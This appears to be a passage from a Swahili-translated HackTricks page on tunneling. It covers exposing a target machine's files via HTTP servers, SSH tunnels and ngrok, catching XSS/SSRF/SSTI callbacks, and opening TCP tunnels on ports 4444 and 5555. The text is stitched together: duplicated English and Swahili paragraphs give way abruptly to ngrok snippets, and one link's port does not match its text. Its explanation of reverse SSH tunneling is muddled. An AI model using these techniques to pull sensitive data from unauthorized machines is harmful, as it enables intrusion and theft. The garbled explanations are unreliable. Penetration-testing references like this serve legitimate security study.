Moja ya njia za kufichua faili kwenye kifaa cha lengo ni kwa kutumia HTTP. Hii inaweza kufanywa kwa kuweka seva rahisi ya HTTP kwenye kifaa chako na kisha kutumia njia ya tunneling kuhamisha trafiki kutoka kifaa cha lengo kwenda kifaa chako.

To set up an HTTP server, you can use tools like Python's `SimpleHTTPServer` module or `http.server` module. These tools allow you to easily create a basic HTTP server that serves files from a specified directory.

Kuweka seva ya HTTP, unaweza kutumia zana kama moduli ya `SimpleHTTPServer` ya Python au moduli ya `http.server`. Zana hizi zinaruhusu kuunda kwa urahisi seva ya HTTP ya msingi ambayo inahudumia faili kutoka kwenye saraka iliyotajwa.

Once the HTTP server is set up, you can use a tunneling technique like SSH port forwarding or reverse SSH tunneling to forward traffic from the target machine to your machine.

Baada ya kuweka seva ya HTTP, unaweza kutumia njia ya tunneling kama SSH port forwarding au reverse SSH tunneling kuhamisha trafiki kutoka kifaa cha lengo kwenda kifaa chako.

With SSH port forwarding, you can forward traffic from a specific port on the target machine to a port on your machine. This allows you to access the files served by the HTTP server on your machine.

Kwa SSH port forwarding, unaweza kuhamisha trafiki kutoka bandari maalum kwenye kifaa cha lengo kwenda bandari kwenye kifaa chako. Hii inakuwezesha kupata faili zinazohudumiwa na seva ya HTTP kwenye kifaa chako.

Reverse SSH tunneling, on the other hand, allows you to forward traffic from a port on your machine to a port on the target machine. This can be useful if the target machine is behind a firewall or NAT and cannot be directly accessed from the internet.

Kwa upande mwingine, reverse SSH tunneling inakuwezesha kuhamisha trafiki kutoka bandari kwenye kifaa chako kwenda bandari kwenye kifaa cha lengo. Hii inaweza kuwa na manufaa ikiwa kifaa cha lengo kimefungwa na firewall au NAT na hakiwezi kupatikana moja kwa moja kutoka kwenye mtandao.

By combining an HTTP server with tunneling techniques, you can expose files on a target machine and access them remotely. This can be useful for various purposes, such as retrieving sensitive information or transferring files between machines.

Kwa kuunganisha seva ya HTTP na njia za tunneling, unaweza kufichua faili kwenye kifaa cha lengo na kuzipata kijijini. Hii inaweza kuwa na manufaa kwa madhumuni mbalimbali, kama vile kupata habari nyeti au kuhamisha faili kati ya vifaa.
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Kusikiliza wito wa HTTP

*Inatumika kwa XSS, SSRF, SSTI ...*
Moja kwa moja kutoka kwa stdout au kwenye kiolesura cha HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Kuchimba huduma ya ndani ya HTTP kwa njia ya handaki
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Mfano rahisi wa usanidi wa ngrok.yaml

Inafungua njia 3:
- 2 TCP
- 1 HTTP na ufunuo wa faili za tuli kutoka /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Vifaa vingine vya kuangalia

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
